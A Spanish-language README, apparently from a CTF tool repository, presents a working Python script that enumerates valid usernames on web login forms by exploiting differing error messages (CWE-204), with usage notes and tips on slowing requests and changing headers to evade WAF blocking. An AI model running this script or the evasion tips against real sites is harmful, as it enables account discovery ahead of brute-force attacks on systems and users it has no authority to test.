# User Enumeration Script en Python para CTF's
Script desarrollado para explotar vulnerabilidades de **Observación de Respuesta Diferencial.** En escenarios donde el backend devuelve mensajes distintos para **"usuario inexistente"** y **"contraseña incorrecta"**, este script automatiza la identificación de cuentas válidas, permitiendo reducir el alcance de un posterior ataque de fuerza bruta.

# Script enum-user basado en errores diferenciales (CWE-204)

## ¿Por qué a veces usar este script para CTF's es mejor que usar Hydra?
Aunque Hydra es muy potente, hay situaciones específicas donde este script de Python sera mas recomendable:

*  **Mensajes de error personalizados:** Hydra es excelente para protocolos estándar (SSH, FTP), pero en formularios web (HTTP-POST) a veces se vuelve "loco" si los mensajes de error no son estándar. Este script busca exactamente la cadena "Wrong password", lo que lo hace mucho más preciso para algunos CTF's

*  **Enumeración vs. Fuerza Bruta:** Hydra está diseñado para probar combinaciones de usuario:contraseña.
  Este script está diseñado para **Enumerar Usuarios.** Su objetivo no es entrar todavía, sino limpiar la lista de 10,000 nombres y decirte: "Oye, de todos estos, el único que existe es Jose".

*  **Evasión de WAF/Sistemas de seguridad:** Hydra envía peticiones de forma muy agresiva. En un script de Python, puedes añadir time.sleep() o cambiar los headers fácilmente para que parezca que es un usuario real navegando, evitando que el servidor te bloquee por exceso de peticiones.

*  **Análisis de respuestas complejas:** Si el servidor no solo cambia el texto, sino que cambia un código en el HTML o una Cookie, con Python puedes capturar ese detalle exacto, algo que con Hydra es mucho más difícil de configurar.


## Comando a utilizar
```bash
python3 enumerator.py http://IP o dominio objetivo/login.php usernames.txt
```

## Explicacion del comanndo
```python3```
 *  Le dice a tu sistema operativo: "Oye, abre el programa Python versión 3 para que lea y ejecute el archivo que viene a continuación".

```enumerator.py```
*  Es nuestro script (el archivo físico).
*  Es el contenedor de toda la lógica que programaste. En términos técnicos, para Python este es el sys.argv[0] (el argumento cero).

```http://IP o dominio objetivo/login.php```
 *  El primer argumento de entrada (sys.argv[1]).
 *  Es el "Input" que el script guardará en la variable target_url. Le indica al script a dónde tiene que enviar las peticiones POST.

**Importante:** Se pone la URL completa del archivo PHP porque es ahí donde reside el formulario de login que procesa los datos. Si en tu CTF la ruta es diferente cambialo.

```usernames.txt```
*  El segundo argumento de entrada (sys.argv[2]).
*  Es el nombre del archivo (diccionario o wordlist) que contiene la lista de nombres.
<br>

**El script toma este nombre, lo abre con la función open(), y empieza a leer línea por línea para sacar los nombres (como jose, marta,luis...) y probarlos.**
<br>
<br>

Espero que os sirva como a mi me ha servido!
Feliz Hacking.

# Script
```python
#!/usr/bin/env python3
import requests
import sys



if len(sys.argv) < 3:
    print(f"Uso: {sys.argv[0]} <url> <wordlist>")
    sys.exit(1)

target_url = sys.argv[1]
wordlist = sys.argv[2]

def enumerate():
    found_count = 0
    with open(wordlist, 'r') as f:
        for line in f:
            user = line.strip()
            # Enviamos pass aleatorio para forzar el error de "Contraseña incorrecta"
            data = {'username': user, 'password': 'password123'}
            
            try:
                r = requests.post(target_url, data=data)
                
                # Lógica basada en la máquina Lookup
                if "Wrong password" in r.text:
                    print(f"[+] USUARIO VÁLIDO ENCONTRADO: {user}")
                    found_count += 1
            except Exception as e:
                print(f"Error con {user}: {e}")
    
    print(f"\n[!] Escaneo finalizado. Usuarios totales: {found_count}")

if __name__ == "__main__":
    enumerate()
```
